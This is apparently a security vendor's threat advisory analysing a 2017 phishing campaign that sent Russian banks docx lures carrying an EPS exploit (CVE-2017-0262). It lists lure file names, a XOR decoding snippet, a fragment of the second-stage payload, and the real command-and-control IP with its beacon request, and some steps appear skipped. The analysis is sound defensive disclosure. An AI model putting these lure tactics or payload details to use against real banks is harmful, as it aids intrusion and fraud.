Russian Bank Offices Hit with Broad Phishing Wave

By far most of the bank-related phishing campaigns described in security advisories and reports consist of bank customers being targeted for their online credentials. Much less common is a phishing campaign targeting the banks themselves. Perhaps fraudsters know that there are a lot more bank customers than there are banks, and generally banks have a more hardened security posture than the average bank’s customer. 
 
Target: multiple bank offices in Russia
But still, payoff potential for a successful bank compromise might be considerable. In this threat advisory, we describe a Russian-language phishing campaign active during the second week of August 2017, targeting not the usual banking customers, but the Russian banks themselves. And in an unusual reversal of typical bank phishing social engineering tactics, the phishing emails purport to be from the bank’s customers. Consider the following phish delivered to the email address displayed on the bank’s website.   In the email screenshot with our added machine translation from Russian, notice the subject line and message body text reflecting a “business customer upset about extra charges on his credit card” social engineering theme (Figure 1).

Figure 2 is a screenshot of another phishing email obtained by RSA FirstWatch, targeting “Russia bank #2.” While this email is part of the same campaign, note that the body text, subject lines, file name, and @mail.com sender email is different from that targeting Russia bank #1, suggesting at least some manual actor modifications to the phishing email construction.

RSA FirstWatch identified 23 such attachments in this campaign, all using what appeared to be the exact same EPS exploit. The disgruntled banking customer was consistent throughout; illustrated below are a few attachment examples:
 
Exploit attachment #1 was deployed with the following names in Russian:
Выписка по счету.docx ("Account statement")
Выписка по карте.docx ("Card statement")
Персональные данные.docx ("Personal information")
 
Exploit attachment #2 was deployed with the following names:
Выписка по карте.docx (or “Card statement”)
Выписка по карте клиента.docx (or “Customer card statement”)
 
Exploit attachment #3 was deployed using the following name:
Выписка.docx (or “Statement”)
 
Note: Hashes of all samples will be included in the Appendix of this analysis.
 
As of 10 August 2017, RSA FirstWatch has high confidence that multiple individuals at many Russian banks were targeted with these malicious attachments, and believe this campaign was subsequently brought to the attention of the Central Bank of Russia’s FinCERT by one or more of the banks being targeted.  On 17 August 2017, the day we were finishing up this analysis, a new sample was discovered being deployed, with a different C2 node and slightly different communication. 
 
An exploit in someone else’s wrapper?
Before we get to details about the exploit used in this campaign, we should cover some history on EPS exploits in docx files. FireEye discovered a malicious docx exploiting a zero day vulnerability in Microsoft’s Encapsulated Postscript (EPS) filter, in the summer of 2015. This EPS exploit was assigned CVE-2015-2545. In March 2017, FireEye observed both nation state and financially motivated actors using EPS zero day exploits assigned as CVE-2017-0261 and CVE-2017-0262, prior to Microsoft disabling EPS rendering in its Office products with an update in April 2017. So it is likely one of these three EPS exploits is being employed with the perpetrator activity under investigation, perhaps hoping that their targets haven’t applied the April patch that would make every EPS exploit futile.
 
Since docx files are just a Zip-compressed container, comparing them with a file tree view might be a quick way to assess similarity on a high level. In fact, all 23 known docx files used in this campaign are very nearly identical, with the same 12 component files. Varying checksums might have to do with build artifacts, perhaps even intentionally so, in order to generate a unique hash with each build.

Interesting enough 10 of these 12 docx component files (everything but the image1.eps and document.xml files) are dated April 18th. This is no coincidence; in fact, those same docx component files were found in the attachment used by nation-state actors in their email targeting of an Eastern European Ministry of Foreign Affairs, back when this EPS exploit was still a zero day (Figure 4).

So if we compare the tree view of that older docx container (Figure 5), we see that 10 of the same component files appear identical, and we can confirm that using cryptographic hashing.

Of special note is the common app.xml file, which comes directly from the decoy document in the “Trump” exploit file. This app.xml file contains the same URL to the California Courier website (www[.]thecaliforniacourier[.]com), where the text was copied from “Trump’s Attack on Syria: Wrong for so Many Reasons” as described by ESET in their exploit analysis.
 
Clearly there was some “borrowing” going on between this current bank-targeting campaign and the previous nation-state espionage campaign. Does this suggest that these campaigns and actors are in any way complicit/related?  No. On the contrary, national interests seem to imply that those particular espionage-focused actors (i.e., from the “Trump” campaign) would almost certainly NOT be involved in broadly exploiting Russian banks a few months later.  That being said, an alternative hypothesis is that these bank-targeting actors purposely purloined the older espionage related docx files to introduce uncertainty and/or mis-attribution, or even to send a message to defenders or researchers.  As we'll see shortly, the attackers also interestingly signed (commented) their malware with lyrics from Slipknot's Snuff.

Which exploit is this?
Obfuscation is important for exploits, especially when a campaign that is broad as this one is up against a gamut of financial institutions with AV’s that have had plenty of time to add detection for known EPS exploits. With initial AV coverage of these two dozen or so attachments in the single digits out of more than 50 AV vendors, RSA Engineering’s Kevin Douglas jumped at the chance to flex his deobfuscation skills, and here steps us through our exploit assessment.  
 
Step 1.  Unzipping the sample DOCX file, reveals the following embedded EPS Image file
unzip ./2c86a55cefd05352793c603421b2d815f0e1ddf08e598e7a3f0f6b1d3928aca8

Step 4. Decoding the payload
Using the multibyte XOR Key (7a5d5e20), the payload can be decoded by XOR’ing each byte of the payload with its (position % 4) in the XOR key. For example, position 0 in the payload is XOR’d against 0x7a, position 1 is XOR’d against 0x5d, position 2 is XOR’d against 0x5e, position 3 is XOR’d against 0x20.  Then the cycle repeats for subsequent payload bytes.  Code similar to what's pasted below would decode it (acBuffer is payload, acKeys is XOR key).
 
   for (int ctr = 0; ctr < sizeof(acPayload) - 1; ctr++) {
      printf("%c", acPayload[ctr] ^ (acKeys[(ctr % 4)]));

Of particular in this last snippet is the block with the “forall” which is the memory corruption routine unique to the known exploit code for CVE-2017-0262, and as described in ESETs analysis on the subject. With bit-for-bit copy of CVE-2017-0262 exploit code, we have reasonable confidence that the exploit we are dealing with is in fact CVE-2017-0262.
 
Step 5.  Second stage payload
The second-stage payload (<558bec83ec3053e8a40200008945fc8b45fc83c030508b4dfc8… ) appears to be a simple hex-encoded blob (no XOR decoding needed).  Converting it from hex to binary and running the UNIX strings command on it yields the following interesting artifacts that hint what the next stage will be…

Command and Control
The malware performs calls back to 137.74.224[.]142, at five second intervals (Figure 6).

The destination hosts offers an HTTP 200 response and “false”.
 
GET /z/get.php?name=c3857e72 HTTP/1.1
Host: 137.74.224.142

False
 
We believe that the actors would not invoke remote control unless they had ruled out nosy researchers.  Based on Google searches identifying the C2 IP address (137.74.224[.]142) as an established Minecraft (multiplayer game) server, we suspect it is possible that the host has been compromised by the perpetrators and is being used without the permission of the owner.  Other previous URL resolutions may be associated with prior customers of the virtual private server (Figure 7).

During the course of this research we found some similarities in look and feel of this campaign (and its potential attribution) with past FirstWatch posts in Attacking a POS Supply Chain part-1 and  CHTHONIC and DIMNIE Campaign Targets Russia 8-2-2017.
 
Thanks to Kent Backman, Kevin.Douglas2@rsa.com, and Christopher Elisan for all their contributions to this research.
